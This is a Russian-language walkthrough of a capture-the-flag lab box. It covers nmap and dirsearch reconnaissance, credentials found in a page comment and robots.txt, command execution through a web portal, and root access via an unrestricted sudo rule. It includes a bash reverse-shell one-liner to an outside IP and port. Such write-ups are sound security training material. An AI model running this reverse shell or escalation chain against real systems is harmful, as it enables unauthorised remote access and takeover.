# Linux
## 10.10.180.32

## Сбор информации

### Nmap 
```
nmap -A 10.10.180.32

Nmap scan report for 10.10.180.32
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:af:25:34:fc:4d:56:d6:ac:8d:63:fe:ae:02:f6:c2 (RSA)
|   256 8e:8d:57:b4:cb:5f:2c:e6:0a:f7:b7:2b:2c:a8:0b:b7 (ECDSA)
|_  256 c3:64:e3:1b:a6:82:c8:d1:54:c5:4b:63:da:6f:9e:5c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### dirsearch
```
dirsearch -x 403 -u 10.10.180.32


  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /Users/evgeniy/reports/_10.10.180.32/_25-04-24_19-59-20.txt

Target: http://10.10.180.32/

[19:59:20] Starting: 
[19:59:35] 301 -  313B  - /assets  ->  http://10.10.180.32/assets/          
[19:59:35] 200 -  587B  - /assets/
[19:59:46] 200 -  455B  - /login.php                                        
[19:59:54] 200 -   17B  - /robots.txt                                       
                                                                             
Task Completed
```

## Осмотр сайта 

Исследуя код главной страницы, находим имя пользователя, которое, понадобится в дальнейшем.

```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

В `http://10.10.180.32/robots.txt` находим набор символов. При использовании данной связки при логине на странице `http://10.10.180.32/login.php` получаем доступ к новой странице `portal.php`.

## 1/3

Введя в консоль `tac Sup3rS3cretPickl3Ingred.txt`, получаем первый ингредиент 

# Rev shell 

используя `bash -c 'bash -i >& /dev/tcp/10.23.88.153/9999 0>&1'` удачно получаем revshell

## 2/3

используя команду `tac /home/rick/second\ ingredients`, получаем второй ингредиент

## Повышение прав в системе

```
www-data@ip-10-10-180-32:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-10-180-32:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-180-32:
    (ALL) NOPASSWD: ALL
www-data@ip-10-10-180-32:/home/rick$ sudo su
sudo su
whoami 
root
```

## 3/3

используя команду `tac /root/3rd`, получаем третий, заключительный, ингредиент